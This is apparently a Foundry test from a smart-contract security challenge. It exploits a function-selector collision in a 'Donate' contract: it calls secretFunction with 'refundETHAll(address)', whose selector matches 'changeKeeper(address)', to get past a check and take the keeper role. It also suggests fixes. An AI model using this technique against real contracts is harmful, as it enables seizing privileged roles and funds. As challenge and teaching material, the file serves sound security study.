// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/donate.sol";

contract donateHack is Test {
    Donate donate;
    address keeper = makeAddr("keeper");
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        donate = new Donate(keeper);
    }

    /**  
        ======== Description ========
        The function abi.encodeWithSignature receives a function signature but internally the contract
        only stored the function selector of the functions, which means that the function signature is
        parsed to a function selector.
        Since the function selector includes only the first 4 bytes of the hash of the signature it is 
        possible to have multiple function signatures that produce the same function selector.
        
        // ======== Attack steps ========
        We could send any string and try to get the same function selector changeKeeper(address) (0x09779838)
        we would need some script to generate random inputs with hashing text to the the same (0x09779838)
        But fortunately for this case it was possible to use an Ethereum signature database to find a function with
        the same selector that we needed. Here is the link to the DB
        https://www.4byte.directory/signatures/?bytes4_signature=0x09779838
        It tells us that the signature refundETHAll(address) produces the same selector that we need.
        Using this signature we can avoid the require() validation which is specific for changeKeeper(address).
        
        // ======== Possible solutions ========
        1- One unsual thing is that the onlyOwner modifier allows msg.sender == address(this)
        this is not a common practice, this contract would be safer if it used Openzeppelin Ownable.sol.
        2- Another way to avoid this vulnerability is to make a require validation of the selector directly
        It could be done like this: 
        require(bytes4(keccak256("changeKeeper(address)")) != bytes4(keccak256(abi.encodePacked(f))), "blocked signature");
    */
    function testhack() public {
        vm.startPrank(hacker);

        bytes4 changeKeeperSelector = bytes4(
            keccak256("changeKeeper(address)")
        );

        bytes4 refundETHAllSelector = bytes4(
            keccak256("refundETHAll(address)")
        );

        assert(changeKeeperSelector == refundETHAllSelector);

        donate.secretFunction("refundETHAll(address)");
        assertTrue(donate.keeper() == hacker);
        assertTrue(donate.keeperCheck() == true);
    }
}
